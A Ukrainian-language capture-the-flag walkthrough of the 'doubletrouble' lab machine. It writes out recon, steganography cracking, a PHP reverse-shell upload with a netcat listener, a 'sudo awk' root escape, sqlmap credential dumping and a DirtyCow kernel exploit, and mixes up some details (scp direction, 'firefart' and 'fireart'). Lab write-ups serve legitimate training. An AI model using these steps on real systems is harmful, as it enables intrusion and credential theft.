<img width="2960" height="853" alt="image" src="https://github.com/user-attachments/assets/08fd7ece-759b-4341-8df5-3ca69467956c" />1. Відстеження IP адреси цільової машини:
sudo netdiscover -r 10.0.2.0/24

<img width="1350" height="470" alt="image" src="https://github.com/user-attachments/assets/ddf54851-0f86-4841-8269-a74dc2a7a2fd" />

В результаті виявляю ip цільової адреси: 10.0.2.4

2. Відстеження відкритих портів цільової машини: sudo nmap -A --reason 10.0.2.4

<img width="1316" height="1045" alt="image" src="https://github.com/user-attachments/assets/974f9d2d-e0b7-4acc-a848-315440c6e624" />

В результаті виявляю 2 відкритих порти: 80 -веб- і 22 ssh-сервери.

3. Розвідка вебсервера.

   Вводжу знайдену адресу пошуковому вікні веббраузера http://10.0.2.4

   <img width="1177" height="948" alt="image" src="https://github.com/user-attachments/assets/4374fd19-8a58-41b8-b5b9-ca1a8639f20e" />

   В результаті виявляю  безкоштовний вебзастосунок qdPM з відкритим кодом для управління проєктами.

   Відстежую приховані директорії з допомогою інтсрументу Gobuster:

   gobuster dir -u http://10.0.2.4/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<img width="1335" height="986" alt="image" src="https://github.com/user-attachments/assets/f049792f-cb9d-40ac-a8bf-ffa4838f3e1e" />

В результаті виявляю приховані директорії, які варто перевірити на підказку.

Перевіривши директорію secret, виявляю файл doubletrouble.jpg, якмй може бути підказкою, яку варто теж верифікувати:

<img width="3140" height="1200" alt="image" src="https://github.com/user-attachments/assets/6a6f8492-c286-4847-8aae-bdd2606e461f" />

<img width="1235" height="957" alt="image" src="https://github.com/user-attachments/assets/7a494ea9-df0e-41db-8bd7-4afee6df640f" />

В результаті виявляю файл у форматі jpg, який завантажую локально:

<img width="1308" height="436" alt="image" src="https://github.com/user-attachments/assets/28112e25-206c-4eae-93d1-a3039b8dc608" />


Далі викристаю стеганоаналіз з допомогою інструменту stegseek: stegseek ~/Downloads/doubletrouble.jpg /usr/share/wordlists/rockyou.txt

<img width="1407" height="346" alt="image" src="https://github.com/user-attachments/assets/6aa0c67c-629d-4f8d-959b-7ffb90fc9904" />

В результаті виявляю парольну фразу "92camaro" і файл doubletrouble.jpg.out

Перегляну вміст файлу doubletrouble.jpg.out

<img width="1942" height="453" alt="image" src="https://github.com/user-attachments/assets/b21ff076-9683-4f00-9ef1-c226f022fa13" />

У файлі виявляю креди: 
otisrush@localhost.com
otis666

Наявні креди дають мені можливість залогінитись в адмінку панелі керування qdPM.

<img width="1330" height="955" alt="image" src="https://github.com/user-attachments/assets/906df64b-12ac-4128-831e-6aaa349c18f5" />

В результаті мені вдається проникнути всередину панелі керування під користувачем otisrush@localhost.com.

Переглядаю деталі користувача:

<img width="1627" height="1069" alt="image" src="https://github.com/user-attachments/assets/5627b662-8c95-4f2c-a202-f749194b8866" />

Виявляю можливість завантажувати файли.

Далі у мене є можливість завантажити реверс шел для .php (уникаючи верифікацію)використовуючи готове рішення: https://github.com/pentestmonkey/php-reverse-shell

Згідно з виявленою версією qdPM 9.1 знаходжу відповідну експлойт на exploit-DB:

<img width="1566" height="1334" alt="image" src="https://github.com/user-attachments/assets/5611abb0-5883-4bb6-a20d-2b266c9f1723" />

Модифікую файл реверс шел і експлойт використовуючи редактор nano, щоб запустити реверс шел:

<img width="1340" height="1076" alt="image" src="https://github.com/user-attachments/assets/3ee2d732-fc79-44ae-9685-8c4a1bc4bc06" />

<img width="1325" height="1078" alt="image" src="https://github.com/user-attachments/assets/48c5b760-5e5d-4234-9b70-ebb2724c4368" />

Далі завантажую файл expl48146.py в профіль користувача otisrush@localhost.com в адмін панелі.

<img width="2108" height="1056" alt="image" src="https://github.com/user-attachments/assets/c6b60b6f-c35f-46fb-943d-7e8e0ab5e80c" />

<img width="1420" height="429" alt="image" src="https://github.com/user-attachments/assets/e2f8ff3c-0ea5-4cde-b50f-bf87bab9ffbb" />

В результаті, зайшовши на http://10.0.2.4/uploads/users, бачу завантажений файл з експлойтом.

Далі запускаю неткат nc -lvnp 4321 і переглядаю файли в uploads по черзі:

<img width="2539" height="807" alt="image" src="https://github.com/user-attachments/assets/beda24a5-f45b-487b-a65f-74cfaf6a2306" />

В результаті реверс шел спрацьовує і дозволяє мені проникнути в систему.

Оскільки привілеї у мого користувача звичайні, необхідно продовжувати пошук підвищити їх.

Далі виконаю інтерактивну оболонку з допомогою команди sudo awk 'BEGIN { system("/bin/bash") }' із правами root:

<img width="829" height="147" alt="image" src="https://github.com/user-attachments/assets/eeff4302-f296-403d-afd9-501cb699264f" />

В результаті ит отримали привілеї root.

Переходжу в директорію root, щоб переглянути вміст: cd /root

<img width="1063" height="315" alt="image" src="https://github.com/user-attachments/assets/1d1609ee-a221-4964-b8e6-d72fdc9280d9" />

В результаті виявляю файл doubletrouble.ova, який є образом віртуальної машини.

Переношу файл у Shared folder Kali Linux:

<img width="882" height="627" alt="image" src="https://github.com/user-attachments/assets/d3671121-b288-44bd-bae7-23a3a98980fd" />

В результаті ova файл готовий до запуску.

Запускаю doubletrouble.ova, який у нас зберігся на VM як "inner":

<img width="731" height="597" alt="image" src="https://github.com/user-attachments/assets/2790b7e6-3148-4918-8238-749a007efe82" />

В результаті цільова машина запущена.

Далі проводжу розвідку IP цільової машини:

<img width="1240" height="441" alt="image" src="https://github.com/user-attachments/assets/2ff00f20-8927-4083-90f3-137df5cf49e2" />

В результаті виявляю IP цільової машини: 10.0.2.5

Сканування на відкриті порти: nmap 10.0.2.5 -p- -sV

<img width="1206" height="434" alt="image" src="https://github.com/user-attachments/assets/ca8250e9-beba-4abb-bbe1-256b52be0e49" />

В результаті виявляю 2 відкриті порти: 22 і 80.

Відкрию знайдену веб адресу у браузері:

<img width="1344" height="464" alt="image" src="https://github.com/user-attachments/assets/3c862ba4-fc90-4e9d-9d75-4fb97a82cb5b" />

В результаті виявляю сторінку входу doubletrouble для адмінів.

Дослідження прихованих директорій з допомогою інструменту dirb: dirb http://10.0.2.5

<img width="800" height="695" alt="image" src="https://github.com/user-attachments/assets/a81644ba-4d09-4898-bda2-13417e98e130" />

В результаті ніяких директорій які б нас зацікавили не виявлено.

Підключаю BurpSuit, запускаємо його і залогінююсь в адмінку:

<img width="3001" height="980" alt="image" src="https://github.com/user-attachments/assets/061bfc94-4e94-45fb-9847-9c7a8180aa2b" />

В результаті отримую HTTP POST запит з параметрами:
POST /index.php HTTP/1.1
Host: 10.0.2.5
Content-Length: 26
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://10.0.2.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.5/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

uname=&psw=&btnLogin=Login

Відсутність валідації запитів дає ще одну підставу перевірити на SQL-інʼєкцію.

Насамперед підготую POST запит на Калі:

cat <<'EOF'>> sql                         
POST /index.php HTTP/1.1
Host: 10.0.2.5
Content-Length: 26
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://10.0.2.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.5/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

uname=&psw=&btnLogin=Login
EOF

І запускаю його у сомандному рядку.

<img width="1301" height="943" alt="image" src="https://github.com/user-attachments/assets/8055c2a1-5101-4985-bee5-9ce4504a3fad" />

Далі застосовую інструмент SQLMap для експлуатації вразливості SQL-інʼєкції: sqlmap -r sql --dbs

<img width="1392" height="992" alt="image" src="https://github.com/user-attachments/assets/157285c9-eca7-4c1a-aa94-7f6d34365834" />

В результаті виявляю бд: doubletrouble та information schemа, також версію MySQL 5.0.12 і пейлоуд.

Застововую   --tables для перевірки наявних таблиць:

sqlmap -r sql -D doubletrouble --tables --batch

<img width="1488" height="441" alt="image" src="https://github.com/user-attachments/assets/f355fe14-2308-4a0c-94b3-57a38cc24ebd" />

В результаті виявляю таблицю users

Оскільки ця таблиця може містити креди для входу, перевіряю її вміст. Використовую параметр --columns для виведення наявних стовпців у таблиці.

<img width="616" height="352" alt="image" src="https://github.com/user-attachments/assets/5d419038-42f3-4e84-853b-7026ecd3b7c8" />

В результаті виявляю стовпці users i password.

Далі застосовую параметр --dump, щоб завантажити повну інформацію з бази даних.

sqlmap -r sql -D doubletrouble -T users -C password,username --dump

<img width="757" height="441" alt="image" src="https://github.com/user-attachments/assets/7ef33d50-c44f-492a-ab04-f0f53e3fe608" />

В результаті виявляю два імені користувачів і їх паролі, які були збережені у відкритому вигляді та доступі в бд.

Оскільки у нас відкритий 22 порт, спробую зайти в адмінку через ssh протокол використовуючи виявлені креди:

Ім’я користувача: clapton
Пароль: ZubZub99

ssh clapton@10.0.2.5

<img width="1230" height="753" alt="image" src="https://github.com/user-attachments/assets/d8715f70-678e-4d79-9e15-786ac6267b02" />

В результаті мені вдається проникнути на цільову машину.

Перевіряю вміст наявних директорій на підказки або прапорці з допомогою команди ls -la:

<img width="974" height="316" alt="image" src="https://github.com/user-attachments/assets/a4e57aba-50c8-40c8-b7b8-ea2056dcef41" />

В результаті виявляю файл user та прапорець: 6CEA7A737C7C651F6DA7669109B5FB52c

Оскільки я маю привілеї звичайного користувача, мені потрібно їх підвищити використовуючи відому вразливість для ядра знайденого в процесі проникнення на цільову машину.

Для цього вводжу в пошуку браузера: 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 exploit db:

<img width="2960" height="853" alt="image" src="https://github.com/user-attachments/assets/f249218d-bdb1-4f57-b5d4-bedc8194669c" />

В результаті знаходжу експлойт на сайті exploit-db за посиланням: https://www.exploit-db.com/exploits/40839

Завантажую експлойт на цільову машину з допомогою  команди scp:

scp clapton@10.0.2.5:/home/clapton/exploit.c /home/kali/40839.c

<img width="1305" height="239" alt="image" src="https://github.com/user-attachments/assets/887de635-07d5-454f-9062-ea9d6fe5aa0c" />

В результаті експлойт перенесено на цільову машину.

Після завантаження компілюю експлойт з допомогою компілятора gcc:

gcc -pthread exploit.c -o dirty -lcrypt

В результаті було створено два файли: dirty і 40839.c.

Запускаю файл ./dirty

і вводжу пароль firefart


<img width="1233" height="857" alt="image" src="https://github.com/user-attachments/assets/c2992b04-44bc-4f17-a209-e268e1115643" />

В результаті при спробі змінити користувача на fireart, мені вдалось змінити користувача і пароль на fireart.



